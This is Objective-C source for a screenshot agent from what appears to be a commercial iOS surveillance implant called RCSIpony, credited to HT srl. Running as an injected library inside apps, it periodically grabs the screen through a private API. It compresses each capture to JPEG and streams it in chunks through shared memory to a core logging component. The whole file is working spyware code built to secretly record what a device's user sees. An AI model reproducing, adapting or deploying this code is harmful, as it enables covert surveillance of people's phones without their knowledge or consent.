/*
 * RCSIpony - Screenshot agent
 *
 *
 * Created by Massimo Chiodini on 08/03/2010
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
#import <UIKit/UIKit.h>
#import <sys/time.h>

#import "RCSIAgentScreenshot.h"

#import "RCSISharedMemory.h"
#import "RCSICommon.h"

typedef struct _screenshot {
  u_int sleepTime;
  u_int dwTag;
  u_int grabActiveWindow; // 1 Window - 0 Entire Desktop
  u_int grabNewWindows;   // 1 TRUE onNewWindow - 0 FALSE
} screenshotAgentStruct;

typedef struct _screenshotHeader {
	u_int version;
#define LOG_SCREENSHOT_VERSION 2009031201
	u_int processNameLength;
	u_int windowNameLength;
} screenshotAdditionalStruct;

typedef struct CGImageDestination *CGImageDestinationRef;

extern CGImageRef UIGetScreenImage();
extern CGImageDestinationRef CGImageDestinationCreateWithURL(CFURLRef url, CFStringRef type, size_t count, CFDictionaryRef options);
extern void CGImageDestinationAddImage(CGImageDestinationRef idst, CGImageRef image, CFDictionaryRef properties);
extern bool CGImageDestinationFinalize(CGImageDestinationRef idst);

//#define DEBUG
#define SCR_WAIT 1

static RCSIAgentScreenshot        *sharedAgentScreenshot = nil;
extern RCSISharedMemory           *mSharedMemoryLogging;


@interface RCSIAgentScreenshot (hidden)

- (NSDictionary *)getActiveWindowInformation;
- (BOOL)_grabScreenshot;

@end

@implementation RCSIAgentScreenshot (hidden)

- (NSDictionary *)getActiveWindowInformation
{
  NSString *bundleIdentifier  = [[NSBundle mainBundle] bundleIdentifier];
  
  NSArray *keys = [NSArray arrayWithObjects: @"windowID",
                                             @"processName",
                                             @"windowName",
                                             nil];
  
  NSArray *objects = [NSArray arrayWithObjects: bundleIdentifier,
                                                bundleIdentifier,
                                                bundleIdentifier,
                                                nil];
  
  NSDictionary *windowInfo = [[NSDictionary alloc] initWithObjects: objects
                                                           forKeys: keys];
  
  return windowInfo;
}

- (BOOL)_grabScreenshot
{
  int                         leftBytesLength = 0,byteIndex = 0;
  long                        logID;
  struct timeval              tp;
  time_t                      logTime;
  CGImageRef                  screenShot;
  NSString                    *processName;
  NSString                    *windowName;
  NSMutableData               *logData;
  NSDictionary                *windowInfo;
  shMemoryLog                 *shMemoryHeader;
  screenshotAdditionalStruct  *agentAdditionalHeader;
   
  NSString *execName = [[NSBundle mainBundle] bundleIdentifier];

  // Fix for iOS: background apps will crash if 
  // trying to grab a shot
  UIApplication *uiApp = [UIApplication sharedApplication];
  
  if (uiApp != nil) 
    {
      UIWindow *keyW = [uiApp keyWindow];
    
      if (keyW != nil)
        {
#ifdef DEBUG
          NSLog(@"%s: application %@ have keywindow %@", __FUNCTION__, execName, keyW);
#endif
        }
      else
        {
#ifdef DEBUG
          NSLog(@"%s: application %@ have not keyWindow", __FUNCTION__);
#endif
          return NO;
        }
    }
  else 
    {
#ifdef DEBUG
      NSLog(@"%s: application %@ have not sharedApplication", __FUNCTION__, execName);
#endif
      return NO;
    }
  
  // Run the screenshot
  screenShot = UIGetScreenImage();
  
  if (screenShot == NULL)
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: Screenshot Agent error on grabbing image for pid %d", __FUNCTION__, getpid());
#endif
      return NO;
    }
  else 
    {
#ifdef DEBUG  
      NSLog(@"[DYLIB] %s: Screenshot Agent image grabbed", __FUNCTION__);
#endif
    }

    UIImage *imgScr = [UIImage imageWithCGImage: screenShot];
  
  if (imgScr == nil)
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: Screenshot Agent error on converting image for pid %d", __FUNCTION__, getpid());
#endif
      return NO;
    }
  else 
    {
#ifdef DEBUG  
      NSLog(@"[DYLIB] %s: Screenshot Agent image grabbed and converted", __FUNCTION__);
#endif
    }
  
  // highest compression
  NSData *entryData = UIImageJPEGRepresentation(imgScr, 0.00);
  
  // JPEG screenshot image data...
  if (entryData == nil) 
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: error reading image file...", __FUNCTION__);
#endif
      return NO;
    }
  else 
    { 
#ifdef DEBUG
      NSString *fileString = [[NSString alloc] initWithFormat: @"/private/var/tmp/snap_%d.jpg", getpid()];

      NSLog(@"[DYLIB] %s: tmp screenshot image %@", __FUNCTION__, fileString);
       
      [[NSFileManager defaultManager] removeItemAtPath: fileString error: nil];
      
      [entryData writeToFile: fileString atomically: YES];
      [fileString release];
#endif
    }
  
  // Log id creating
  ctime(&logTime);
  logID       = getpid() ^ logTime;
  processName = [[NSBundle mainBundle] bundleIdentifier];
  windowName  = [[NSBundle mainBundle] bundleIdentifier];
  
#ifdef DEBUG
  NSLog(@"[DYLIB] %s: screenshot log id = %d [%d - %d]", __FUNCTION__, logID, getpid(), logTime);
#endif
  
  //
  // Fill in the agent additional header
  //
  NSMutableData *rawAdditionalHeader = [[NSMutableData alloc] initWithLength: sizeof(screenshotAdditionalStruct) +
                                                                      [processName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding] +
                                                                      [windowName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  
  int processNameLength = [processName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  int windowNameLength  = [windowName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  agentAdditionalHeader = (screenshotAdditionalStruct *)[rawAdditionalHeader bytes];
  
  agentAdditionalHeader->version = LOG_SCREENSHOT_VERSION;
  agentAdditionalHeader->processNameLength = processNameLength;
  agentAdditionalHeader->windowNameLength  = windowNameLength;

  // Unfortunately we have to use replaceBytesInRange and mess with size
  // instead of doing a raw appendData
  [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(screenshotAdditionalStruct), processNameLength)
                                 withBytes: [[processName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
  
  [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(screenshotAdditionalStruct) + processNameLength, windowNameLength)
                                 withBytes: [[windowName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
  
#ifdef DEBUG
  NSLog(@"[DYLIB] %s: Screenshot Agent additionalHeader: %@", __FUNCTION__, rawAdditionalHeader);
#endif

  logData         = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  shMemoryHeader  = (shMemoryLog *)[logData bytes];
  
  gettimeofday(&tp, NULL);
  
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->logID           = logID;
  shMemoryHeader->agentID         = AGENT_SCREENSHOT;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_CREATE_LOG_HEADER;
  shMemoryHeader->flag            = 0;
  shMemoryHeader->commandDataSize = [rawAdditionalHeader length];
  shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
  
  memcpy(shMemoryHeader->commandData,
         [rawAdditionalHeader bytes],
         [rawAdditionalHeader length]);
  
  [rawAdditionalHeader release];
  
  if ([mSharedMemoryLogging writeMemory: logData
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: Screenshot Agent sent log header through Shared Memory", __FUNCTION__);
#endif
    }
  else
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: Screenshot Agent errror while sending log header to shared memory", __FUNCTION__);
#endif
    }
  
  [logData release];
  
#ifdef DEBUG
  NSLog(@"[DYLIB] %s: sending %d bytes in %d chunks", __FUNCTION__, [entryData length], [entryData length]/0x300);
#endif
  
  do
    {
      logData        = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
      shMemoryHeader = (shMemoryLog *)[logData bytes];
    
      leftBytesLength = (([entryData length] - byteIndex >= 0x300)
                         ? 0x300
                         : ([entryData length] - byteIndex));
    
      memcpy(shMemoryHeader->commandData,
             [entryData bytes] + byteIndex,
             leftBytesLength);
    
      byteIndex += leftBytesLength;
    
      // Last block writing...
      if (byteIndex >= [entryData length])
        {
#ifdef DEBUG
          NSLog(@"[DYLIB] %s: Screenshot Agent sending close log to shared Memory", __FUNCTION__);
#endif
          shMemoryHeader->commandType   = CM_CLOSE_LOG;
        }
      else
        {
          shMemoryHeader->commandType   = CM_LOG_DATA;
        }
    
      gettimeofday(&tp, NULL);
      
      shMemoryHeader->status          = SHMEM_WRITTEN;
      shMemoryHeader->logID           = logID;
      shMemoryHeader->agentID         = AGENT_SCREENSHOT;
      shMemoryHeader->direction       = D_TO_CORE;
      shMemoryHeader->flag            = 0;
      shMemoryHeader->commandDataSize = leftBytesLength;    
      shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
     
      if ([mSharedMemoryLogging writeMemory: logData
                                     offset: 0
                              fromComponent: COMP_AGENT] == TRUE)
        {
#ifdef DEBUG
          NSLog(@"[DYLIB] %s: Screenshot Agent logged image chunk %x [%x]", __FUNCTION__, byteIndex, leftBytesLength);
#endif
        }
      else
        {
#ifdef DEBUG
          NSLog(@"[DYLIB] %s: Screenshot Agent error while logging screenshot to shared memory", __FUNCTION__);
#endif
        }
    
      [logData release];
    
    } while (byteIndex < [entryData length]);

#ifdef DEBUG
  NSLog(@"[DYLIB] %s: end of grabbing", __FUNCTION__);
#endif
  
  return YES;
}

@end

@implementation RCSIAgentScreenshot

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSIAgentScreenshot *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentScreenshot == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedAgentScreenshot;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentScreenshot == nil)
      {
        sharedAgentScreenshot = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedAgentScreenshot;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (void)start
{
  int  grabCounter;
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

#ifdef DEBUG
  NSLog(@"[DYLIB] %s: Agent screenshot started", __FUNCTION__);
#endif
  
  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
  
#ifdef DEBUG
  NSLog(@"[DYLIB] %s AgentConf: %@", __FUNCTION__, mAgentConfiguration);
#endif
  
  screenshotAgentStruct *screenshotRawData;
  screenshotRawData = (screenshotAgentStruct *)[[mAgentConfiguration objectForKey: @"data"] bytes];
  
  int sleepTime = screenshotRawData->sleepTime/1000;
  grabCounter   = sleepTime;
  
#ifdef DEBUG
  NSLog(@"[DYLIB] %s: Screenshot Agent grab image every %d sec.", __FUNCTION__, sleepTime);
#endif
  
  usleep(1500000);
  
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
         [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    
      //[[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: SCR_WAIT]];
      
      // fix for iOS4
      sleep(SCR_WAIT);
    
      if (grabCounter == sleepTime)
        {
          if([self _grabScreenshot] == YES)
            {
#ifdef DEBUG
              NSLog(@"[DYLIB] %s: Screenshot grabbed correctly", __FUNCTION__);
#endif
            }
          else
            {
#ifdef DEBUG
              NSLog(@"[DYLIB] %s: An error occurred while snapshotting", __FUNCTION__);
#endif
            }
          grabCounter = 0;
        }
      else 
        {
          grabCounter++;
        }

#ifdef DEBUG
    NSLog(@"[DYLIB] %s: innerPool release", __FUNCTION__);
#endif

      [innerPool release];
    }
  
  if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
    [mAgentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
  
  [outerPool release];
}

- (BOOL)stop
{
  int internalCounter = 0;
  
#ifdef DEBUG
  NSLog(@"[DYLIB] %s: stopping Screenshot Agent", __FUNCTION__);
#endif
  
  [mAgentConfiguration setObject: AGENT_STOP forKey: @"status"];
  
  
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED &&
         internalCounter <= MAX_WAIT_TIME)
    {
      internalCounter++;
      sleep(1);
    }
  
#ifdef DEBUG
  NSLog(@"[DYLIB] %s: stopped Screenshot Agent in %d sec.", __FUNCTION__, internalCounter);
#endif  
  
  return YES;
}

- (BOOL)resume
{
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
  if (aConfiguration != mAgentConfiguration)
    {
      [mAgentConfiguration release];
      mAgentConfiguration = [aConfiguration retain];
    }
}

- (NSMutableDictionary *)mAgentConfiguration
{
  return mAgentConfiguration;
}

@end
